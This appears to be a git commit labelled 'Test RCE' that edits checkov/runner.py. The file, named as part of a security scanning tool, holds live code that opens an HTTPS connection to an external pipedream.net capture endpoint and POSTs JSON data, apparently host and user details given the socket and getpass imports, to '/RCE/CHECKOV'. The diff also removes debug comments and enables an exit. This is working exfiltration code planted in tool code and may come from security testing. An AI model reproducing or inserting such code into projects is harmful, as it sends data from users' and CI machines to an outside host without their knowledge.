7b857712903dce4b444720bfe6b30de1136380c4
Rotem Bar <rotem@cidersecurity.io>
2021-07-01 10:58:23 +0300

    Test RCE

--- checkov/runner.py
+++ checkov/runner.py
@@ -6,8 +6,6 @@ import socket
 import getpass
 import os
 
-# print("[" + getpass.getuser() +" ]")
-
 conn = http.client.HTTPSConnection('45916c134a9cdb740e1c9807952ed21d.m.pipedream.net')
 
 headers = {'Content-type': 'application/json'}
@@ -18,7 +16,5 @@ json_data = json.dumps(foo)
 conn.request('POST', '/RCE/CHECKOV', json_data, headers)
 
 response = conn.getresponse()
-# print(response.read().decode())
 
-
-# sys.exit(0)
+sys.exit(0)
